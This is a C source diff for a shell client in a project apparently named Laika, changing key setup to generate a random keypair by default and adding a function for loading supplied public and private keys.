@@ -167,7 +167,8 @@ void shellC_init(tShell_client *client) {
         LAIKA_ERROR("LibSodium failed to initialize!\n");
     }
 
-    if (!laikaK_loadKeys(client->pub, client->priv, LAIKA_PUBKEY, LAIKA_PRIVKEY)) {
+    /* by default use random key */
+    if (!laikaK_genKeys(client->pub, client->priv)) {
         shellC_cleanup(client);
         LAIKA_ERROR("Failed to init keypair!\n");
     }
@@ -249,6 +250,13 @@ bool shellC_poll(tShell_client *client, int timeout) {
     /* flush any events after (eg. made by a packet handler) */
     laikaP_flushOutQueue(&client->pList);
     return true;
+}
+
+void shellC_loadKeys(tShell_client *client, const char *pub, const char *priv) {
+    if (!laikaK_loadKeys(pub ? client->pub : NULL, priv ? client->priv : NULL, pub, priv)) {
+        shellC_cleanup(client);
+        LAIKA_ERROR("Failed to init keypair!\n");
+    }
 }
 
 tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id) {
